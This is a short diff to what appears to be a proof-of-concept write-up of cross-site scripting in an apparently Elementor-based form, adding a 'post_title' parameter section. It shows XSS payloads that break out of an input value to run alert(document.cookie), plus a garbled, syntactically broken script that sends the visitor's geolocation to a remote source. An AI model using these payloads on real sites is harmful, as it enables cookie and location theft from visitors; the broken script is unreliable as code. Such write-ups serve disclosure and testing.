@@ -31,3 +31,7 @@ nu11secur1ty<script>alert(document.cookie)</script>
 ```
 <script>Var today = new Date().toLocaleString() + 'week' + 'day one two three four five six'.charAt(new Date().getDay());document.getElementById('remote').src = "htttp:// + today + "----" + encodeURIComponent(position.coords.latitude) + "," + encodeURIComponent(position.coords.longitude</script>
 ```
+## "post_title" parameter
+```
+<input class="elementor-field elementor-field-textual elementor-size-lg" type="text" placeholder="" value="\"><script>alert(document.cookie)</script><\"" name="post_title" id="dce_view_f9fc119_post_title">
+```
